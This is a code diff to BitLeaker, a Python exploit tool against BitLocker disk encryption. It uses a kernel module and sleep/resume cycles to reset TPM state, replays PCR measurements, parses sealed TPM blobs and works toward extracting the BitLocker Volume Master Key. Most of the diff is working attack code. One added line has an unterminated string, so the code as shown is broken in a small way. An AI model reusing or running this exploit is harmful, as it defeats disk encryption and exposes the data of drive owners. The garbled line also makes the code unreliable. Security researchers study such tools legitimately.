@@ -170,16 +170,21 @@ class BitLeaker(Display):
     #
     def doze(self):
         if self.module_loaded:
-          self.info_print('Entering sleep...\n')
-          self.info_print('    [>>] Press [Enter] to doze...')
-          input('')
-          subprocess.call(['sudo','rtcwake','--mode','mem','-s','5'], stdout=self.FNULL, stderr=self.FNULL)
-          self.info_print('    [<<] Concious...\n')
-          sleep(1)
-          return 1
+            self.info_print('Entering sleep...\n')
+            self.info_print('    [>>] Press [Enter] to doze...')
+            input('')
+            subprocess.call(['sudo','rtcwake','--mode','mem','-s','5'], stdout=self.FNULL, stderr=self.FNULL)
+            self.info_print('    [<<] Concious...\n')
+            # Need this to set the stupid 'orderly' bit
+            self.info_print('    [<<] restoring TPM...\n)
+            self.manage_kernel_module('stop')
+            subprocess.call(['sudo','rtcwake','--mode','mem','-s','30'], stdout=self.FNULL, stderr=self.FNULL)
+            self.info_print('    [<<] Concious...\n')
+            sleep(1)
+            return 1
         else:
-          self.color_print('BitLeaker module is not loaded.', Color.FAIL)
-          return 0
+            self.color_print('BitLeaker module is not loaded.', Color.FAIL)
+            return 0
 
     #
     # Collect the system logs containing the PCRs
@@ -294,7 +299,7 @@ class BitLeaker(Display):
             else: return False
         if mode == "stop" and self.module_loaded:
             try:
-                subprocess.check_call(['sudo','false','./bitleaker-kernel-module/bitleaker-kernel-module.ko'])
+                subprocess.check_call(['sudo','rmmod','bitleaker-kernel-module'])
                 self.module_loaded = False
             except subprocess.CalledProcessError as e:
                 self.color_print('Stop FAILED\n',Color.FAIL)
@@ -422,6 +427,32 @@ class TPMInterface(Display):
         #self.stop_rsrc_mgr()
 
     #
+    # Extract private/public data and PCR policy 
+    #
+    def extract_priv_pub_and_pcr_policy_from_raw_blob(self, raw_tpm_blob):
+        #print("RAW TPM BLOB: ",end='')
+        #print(raw_tpm_blob)
+        if self.hash_type == HashTypes.SHA1.value:
+            hash_length = 20
+        else:
+            hash_length = 32
+            
+        hex_data = []
+        for line in raw_tpm_blob:
+            line = line.replace('-', ' ')
+            line = line.replace('  ', ' ')
+            data_list = line.split(' ')
+            hex_data = hex_data + data_list[:-1]
+
+        hex_data = hex_data[:]
+
+        print("hex_data:",end="")
+        print(hex_data)
+        priv_pub = [int(hex_data[i], 16) for i in range(0, len(hex_data)-(hash_length+6))]
+        pcr_policy = [int(hex_data[i], 16) for i in range(len(hex_data)-(hash_length+7), len(hex_data))]
+        return(priv_pub, pcr_policy)
+
+    #
     # Prepare TPM data for unsealing VMK of BitLocker
     #
     def prepare_tpm_data(self, drive_path):
@@ -434,7 +465,7 @@ class TPMInterface(Display):
         self.color_print('Success\n', Color.SUCCESS)
 
         self.info_print('    [>>] Convert TPM-encoded blob to hex data... ')
-        hex_priv_pub, pcr_policy = extract_priv_pub_and_pcr_policy_from_raw_blob(raw_data_list)
+        hex_priv_pub, pcr_policy = self.extract_priv_pub_and_pcr_policy_from_raw_blob(raw_data_list)
         self.color_print('Success\n', Color.SUCCESS)
         self.info_print('    [>>] raw_data_list:\n%s,%d\n' % (raw_data_list, len(raw_data_list)))
         self.info_print('    [>>] hex_priv:\n%s,%d\n' % (hex_priv_pub, len(hex_priv_pub)))
@@ -593,27 +624,6 @@ def get_raw_tpm_encoded_blob_from_dislocker(drive_path):
     return raw_data
 
 #
-# Extract private/public data and PCR policy 
-#
-def extract_priv_pub_and_pcr_policy_from_raw_blob(raw_tpm_blob):
-    #print("RAW TPM BLOB: ",end='')
-    #print(raw_tpm_blob)
-    hex_data = []
-    for line in raw_tpm_blob:
-        line = line.replace('-', ' ')
-        line = line.replace('  ', ' ')
-        data_list = line.split(' ')
-        hex_data = hex_data + data_list[:-1]
-
-    hex_data = hex_data[:]
-
-    print("hex_data:",end="")
-    print(hex_data)
-    priv_pub = [int(hex_data[i], 16) for i in range(0, len(hex_data)-(22+4))]
-    pcr_policy = [int(hex_data[i], 16) for i in range(len(hex_data)-(22+5), len(hex_data) - 1)]
-    return(priv_pub, pcr_policy)
-
-#
 # Extract VMK from TPM result
 #
 def extract_vmk_from_tpm_result(tpm_output):
@@ -692,7 +702,7 @@ if __name__ == '__main__':
     #       data use.
     #
     exploit.leak()
-    exploit.start_tpm()
+    #exploit.start_tpm()
     exploit.process_pcr_logs()
 
     tpm     = TPMInterface(exploit.logs(),type=exploit.type())
@@ -701,7 +711,7 @@ if __name__ == '__main__':
     # Prepare TPM data and extract VMK
     ##f = open(filename,'wb')
     tpm.prepare_tpm_data(exploit.bitlocker_path())
-    vmk_data = tpm.execute_tpm_cmd_and_extract_vmk()
+    #vmk_data = tpm.execute_tpm_cmd_and_extract_vmk()
 
     ##f.write(hexlify(bytearray(vmk_data)))
     ##f.close()
